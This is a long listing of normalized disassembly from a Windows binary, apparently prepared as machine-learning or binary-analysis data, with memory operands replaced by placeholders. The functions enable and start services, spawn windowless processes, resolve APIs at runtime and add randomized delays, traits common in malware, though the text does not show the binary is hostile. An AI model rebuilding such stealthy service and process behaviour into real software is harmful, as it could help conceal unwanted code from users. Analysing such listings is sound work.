jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
mov [ ebp - 0x4 ] r--data
push 0x8
push 0x1
push 0x0
push [ ebp - 0x4 ]
push rw-data
call [ CryptAcquireContextW@IAT ]
sub_413118
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
mov eax [ rw-data ]
or eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
sub eax [ rw-data ]
mov ecx [ ebp - 0x4 ]
sbb ecx [ rw-data ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
push 0x0
push 0x989680
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_41f670
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
leave
retn
push [ ebp - 0xc ]
push r--data
call [ SystemTimeToFileTime@IAT ]
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov [ rw-data ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] eax
sub_4131a2
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x1
push [ ebp - 0x8 ]
call [ rw-data ]
neg eax
sbb eax eax
neg eax
jmp r-xdata
leave
retn
sub_4131cb
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x1
push [ ebp - 0x8 ]
call [ rw-data ]
neg eax
sbb eax eax
neg eax
jmp r-xdata
leave
retn
sub_4131f4
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
setne al
leave
retn
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
sub_413247
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor al al
jmp r-xdata
push 0xf01ff
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
call [ OpenServiceW@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
leave
retn
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
push 0x2
push 0xffffffff
push [ ebp - 0x4 ]
call [ ChangeServiceConfigW@IAT ]
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x5 ] al
push 0x0
push 0x0
push [ ebp - 0x4 ]
call [ StartServiceW@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0xc ]
call [ CloseServiceHandle@IAT ]
xor al al
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
call [ GetLastError@IAT ]
cmp eax 0x420
je r-xdata
and [ ebp - 0x18 ] 0x0
jmp r-xdata
mov al [ ebp - 0x18 ]
mov [ ebp - 0x5 ] al
push [ ebp - 0x4 ]
call [ CloseServiceHandle@IAT ]
push [ ebp - 0xc ]
call [ CloseServiceHandle@IAT ]
mov al [ ebp - 0x5 ]
sub_41333d
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
add edx 0x5718
mov ecx [ ebp - 0x4 ]
call sub_410c77
mov edx [ ebp - 0x4 ]
add edx 0x5748
mov ecx [ ebp - 0x4 ]
call sub_410c77
mov edx [ ebp - 0x4 ]
add edx 0x5730
mov ecx [ ebp - 0x4 ]
call sub_410c77
mov eax [ ebp - 0x4 ]
push [ eax + 0x5764 ]
call [ CloseHandle@IAT ]
leave
retn
sub_413391
push ebp
mov ebp esp
push 0xffffffff
push sub_42384d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x10 ]
call sub_402f1e
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov eax [ ebp - 0x10 ]
mov [ eax + 0xc ] r--data
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
mov [ eax + 0x10 ] ecx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
mov [ eax + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0xc0000005
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax + 0xc ] r--data
jmp r-xdata
cmp [ ebp - 0x14 ] 0xc000008e
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
mov eax [ ebp - 0x10 ]
mov [ eax + 0xc ] r--data
cmp [ ebp - 0x14 ] 0xc0000094
je r-xdata
jmp r-xdata
sub_413434
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x10 ]
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
call sub_417318
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
call [ lstrlenW@IAT ]
mov ecx [ ebp - 0x8 ]
lea eax [ ecx + eax * 2 + 0x2 ]
mov [ ebp - 0x8 ] eax
leave
retn 0x4
mov eax [ ebp - 0x4 ]
push [ ebp - 0x10 ]
push [ ebp - 0x4 ]
call [ lstrcpyW@IAT ]
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call [ lstrcatW@IAT ]
sub_4134ac
push ebp
mov ebp esp
sub esp 0x44
push esi
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] ecx
push [ ebp - 0x20 ]
call [ lstrlenW@IAT ]
mov [ ebp - 0xc ] eax
push [ ebp + 0x8 ]
call [ lstrlenW@IAT ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
inc edx
mov eax [ ebp - 0x10 ]
inc eax
imul edx eax
mov ecx [ ebp - 0x1c ]
call sub_417318
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
imul eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x4 ]
call sub_40103d
pop ecx
pop ecx
and [ ebp - 0x8 ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
pop esi
leave
retn 0x4
mov [ ebp - 0x11 ] 0x0
and [ ebp - 0x8 ] 0x0
jmp r-xdata
and [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
call sub_417232
mov al [ ebp - 0x11 ]
mov eax [ ebp - 0x8 ]
imul eax [ ebp - 0x10 ]
add eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax - 0x1 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
and eax 0x1f
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x20 ]
movzx eax [ ecx + eax * 2 ]
push eax
call sub_4031ad
pop ecx
mov esi eax
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
push eax
call sub_4031ad
pop ecx
cmp esi eax
je r-xdata
jmp r-xdata
mov [ ebp - 0x11 ] 0x1
jmp r-xdata
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
cmp eax 0x3f
jne r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x28 ] 0x1
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
cmp eax 0x2a
jne r-xdata
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
mov eax [ ebp - 0x8 ]
dec eax
imul eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax - 0x1 ]
inc eax
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x18 ]
inc eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
imul eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x28 ]
mov [ ecx + eax ] dl
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov [ ebp - 0x30 ] 0x1
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp - 0x8 ]
dec eax
imul eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov [ ebp - 0x2c ] 0x1
mov eax [ ebp - 0x8 ]
dec eax
imul eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax - 0x1 ]
inc eax
mov [ ebp - 0x2c ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x34 ]
jle r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov [ ebp - 0x44 ] 0x1
mov eax [ ebp - 0x8 ]
dec eax
imul eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x3c ] 0x1
cmp [ ebp - 0x18 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x8 ]
imul eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov dl [ ebp - 0x40 ]
mov [ ecx + eax ] dl
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp - 0x8 ]
dec eax
imul eax [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax - 0x1 ]
inc eax
mov [ ebp - 0x38 ] eax
jmp r-xdata
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x3c ] eax
jmp r-xdata
sub_413729
push ebp
mov ebp esp
sub esp 0x40
push esi
push edi
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x28 ] 0x20
push 0x8
pop ecx
xor eax eax
lea edi [ ebp - 0x24 ]
[ edi ]
mov ecx [ ebp - 0x3c ]
call sub_4130bb
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x20
push [ ebp - 0x4 ]
call [ CryptGenRandom@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x38 ]
push eax
call [ GetSystemTime@IAT ]
movzx esi [ ebp - 0x2a ]
call [ GetTickCount@IAT ]
shl eax 0xd
xor esi eax
xor esi [ rw-data ]
mov [ rw-data ] esi
mov eax [ rw-data ]
imul eax eax 0x19660d
add eax 0x3c6ef35f
xor edx edx
div [ ebp - 0x40 ]
mov [ rw-data ] edx
mov eax [ ebp - 0x24 ]
xor edx edx
div [ ebp - 0x40 ]
mov [ rw-data ] edx
jmp r-xdata
mov eax [ rw-data ]
pop edi
pop esi
leave
retn
sub_4137bf
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ SystemTimeToFileTime@IAT ]
lea ecx [ ebp - 0x18 ]
call sub_413118
leave
retn
sub_4137e7
push ebp
mov ebp esp
sub esp 0x60
mov [ ebp - 0x60 ] edx
mov [ ebp - 0x5c ] ecx
push 0x44
lea eax [ ebp - 0x58 ]
push eax
call sub_40103d
pop ecx
pop ecx
push 0x10
lea eax [ ebp - 0x10 ]
push eax
call sub_40103d
pop ecx
pop ecx
mov [ ebp - 0x58 ] 0x44
mov [ ebp - 0x2c ] 0x81
and [ ebp - 0x28 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
push 0x8000000
push 0x0
push 0x0
push 0x0
push [ ebp + 0x8 ]
push [ ebp - 0x60 ]
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
xor al al
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
leave
retn 0x8
sub_41385f
push ebp
mov ebp esp
push 0xffffffff
push sub_42385f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
call sub_413391
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov eax [ ebp - 0x10 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x10 ]
and [ eax + 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ eax + 0x14 ] 0x1
sete cl
mov eax [ ebp - 0x10 ]
mov [ eax + 0x18 ] cl
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x18 ]
mov [ eax + 0x1c ] ecx
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_4138d4
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x3c ] 0xc0000005
je r-xdata
mov eax [ ebp + 0xc ]
push [ eax ]
lea ecx [ ebp - 0x20 ]
call sub_41385f
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_406cc4
jmp r-xdata
jmp r-xdata
leave
retn
mov eax [ ebp + 0xc ]
push [ eax ]
lea ecx [ ebp - 0x38 ]
call sub_413391
push r--data
lea eax [ ebp - 0x38 ]
push eax
call sub_406cc4
sub_413935
push ebp
mov ebp esp
push 0xffffffff
push sub_42387d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_413925
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
imul eax eax 0x14
mov ecx [ ebp - 0x14 ]
call [ ecx + eax + 0x50c ]
pop ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4139b4
push ebp
mov ebp esp
push 0xffffffff
push sub_423887
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_413925
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
and [ ebp - 0x14 ] 0x0
push 0xffffffff
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
movzx eax [ ecx + eax + 0x98c ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
call [ ecx + eax + 0x878 ]
pop ecx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
call sub_4131cb
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
imul eax eax 0x118
mov ecx [ ebp - 0x18 ]
movzx eax [ ecx + eax + 0x98c ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
lea edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
call sub_4131a2
sub_413a96
push ebp
mov ebp esp
push 0xffffffff
push sub_423891
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_413925
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
and [ ebp - 0x14 ] 0x0
push 0xffffffff
call [ GetCurrentThread@IAT ]
push eax
call [ SetThreadPriority@IAT ]
mov eax [ ebp - 0x18 ]
movzx eax [ eax + 0xc ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x18 ]
push [ eax + 0x4 ]
mov eax [ ebp - 0x18 ]
call [ eax ]
pop ecx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x4 ]
call sub_4131cb
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
movzx eax [ eax + 0xc ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x4 ]
call sub_4131a2
sub_413b4b
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x8 ]
cdq
push 0x3
pop ecx
idiv ecx
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
shl eax 0x1
cdq
push 0x3
pop ecx
idiv ecx
mov edx eax
mov ecx [ ebp - 0x4 ]
call sub_413729
add eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
push 0x0
mov eax [ ebp - 0x8 ]
imul eax eax 0x3e8
push eax
call [ SleepEx@IAT ]
leave
retn
sub_413b96
push ebp
mov ebp esp
push 0xffffffff
push sub_4238a9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ ebp - 0x10 ] ecx
mov eax [ rw-data ]
and eax 0x1
jne r-xdata
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ rw-data ]
or eax 0x1
mov [ rw-data ] eax
and [ ebp - 0x4 ] 0x0
or edx 0xffffffff
mov ecx [ ebp - 0x10 ]
call sub_413729
mov [ rw-data ] eax
or [ ebp - 0x4 ] 0xffffffff
sub_413bfd
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
push 0x29
pop edx
mov ecx [ ebp - 0xc ]
call sub_413729
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
imul eax eax 0xc
add eax rw-data
push eax
push [ ebp - 0x10 ]
call [ lstrcpyW@IAT ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
xor al al
jmp r-xdata
mov al 0x1
push 0x29
pop edx
mov ecx [ ebp - 0xc ]
call sub_413729
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
leave
retn 0x4
mov eax [ ebp - 0x8 ]
imul eax eax 0xc
add eax rw-data
push eax
push [ ebp - 0x10 ]
call [ lstrcatW@IAT ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x29
jl r-xdata
mov eax [ ebp + 0x8 ]
dec eax
mov [ ebp + 0x8 ] eax
je r-xdata
and [ ebp - 0x8 ] 0x0
sub_413c8f
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
push 0x20
pop edx
mov ecx [ ebp - 0xc ]
call sub_413729
mov [ ebp - 0x8 ] eax
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov cx [ ecx * 2 + rw-data ]
mov [ eax ] cx
xor al al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
and [ ecx + eax * 2 ] 0x0
mov al 0x1
push 0x20
pop edx
mov ecx [ ebp - 0xc ]
call sub_413729
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx * 2 + rw-data ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
leave
retn 0x4
mov eax [ ebp + 0x8 ]
dec eax
mov [ ebp + 0x8 ] eax
je r-xdata
sub_413d0e
push ebp
mov ebp esp
sub esp 0x644
mov [ ebp - 0x644 ] ecx
push 0x1
push 0x208
lea edx [ ebp - 0x210 ]
mov ecx [ ebp - 0x644 ]
call sub_415b6c
movzx eax al
test eax eax
je r-xdata
xor al al
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
push 0x2
lea edx [ ebp - 0x210 ]
mov ecx [ ebp - 0x644 ]
call sub_411abb
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push rw-data
call [ lstrlenA@IAT ]
push eax
push rw-data
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x644 ]
call sub_4119b9
push 0x14
push r--data
lea eax [ ebp - 0x640 ]
push eax
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x640 ]
push eax
call [ lstrlenA@IAT ]
push eax
lea eax [ ebp - 0x640 ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x644 ]
call sub_4119b9
push rw-data
call [ lstrlenA@IAT ]
push eax
push rw-data
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x644 ]
call sub_4119b9
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x644 ]
call sub_411aa5
push 0x104
lea eax [ ebp - 0x418 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push r--data
lea eax [ ebp - 0x418 ]
push eax
call [ lstrcpyW@IAT ]
cmp [ ebp - 0x8 ] 0x104
jae r-xdata
push 0xa
call [ Sleep@IAT ]
mov al 0x1
jmp r-xdata
push r--data
lea eax [ ebp - 0x418 ]
push eax
call [ lstrcatW@IAT ]
jmp r-xdata
leave
retn
push r--data
lea eax [ ebp - 0x620 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x620 ]
push eax
call [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x620 ]
push eax
call [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x620 ]
push eax
call [ lstrcatW@IAT ]
mov ecx [ ebp - 0x644 ]
call sub_415c32
push eax
lea eax [ ebp - 0x620 ]
push eax
call [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x620 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x620 ]
push eax
lea edx [ ebp - 0x418 ]
mov ecx [ ebp - 0x644 ]
call sub_4137e7
movzx eax al
test eax eax
je r-xdata
sub_413eea
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_415c32
mov edx eax
mov ecx [ ebp - 0x4 ]
call sub_4137e7
movzx eax al
test eax eax
je r-xdata
xor al al
leave
retn
push 0x0
call [ ExitProcess@IAT ]
sub_413f1a
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
leave
retn 0x4
and [ ebp - 0xc ] 0x0
push r--data
push [ ebp - 0x14 ]
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
push r--data
push [ ebp - 0x14 ]
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
mov [ ebp - 0xc ] eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
mov [ ebp - 0xc ] eax
jmp r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ ebp - 0x4 ] 0x20
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
imul eax eax 0x44
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + eax + 0x4e80 ]
call sub_4012a4
movzx eax al
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call [ LoadLibraryW@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x44
mov ecx [ ebp - 0x10 ]
mov eax [ ecx + eax + 0x4e80 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x20
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x44
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + eax + 0x4e80 ]
call sub_4012c4
movzx eax al
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x44
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ ecx + eax + 0x4e80 ] edx
push [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
imul eax eax 0x44
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + eax + 0x4e80 ]
call sub_40124d
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
sub_414062
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push sub_4012db
push 0x20
push 0x118
mov eax [ ebp - 0x4 ]
add eax 0x878
push eax
call sub_4014e7
push sub_4012db
push 0x20
push 0x118
mov eax [ ebp - 0x4 ]
add eax 0x2b7c
push eax
call sub_4014e7
push sub_40121a
push 0x20
push 0x44
mov eax [ ebp - 0x4 ]
add eax 0x4e80
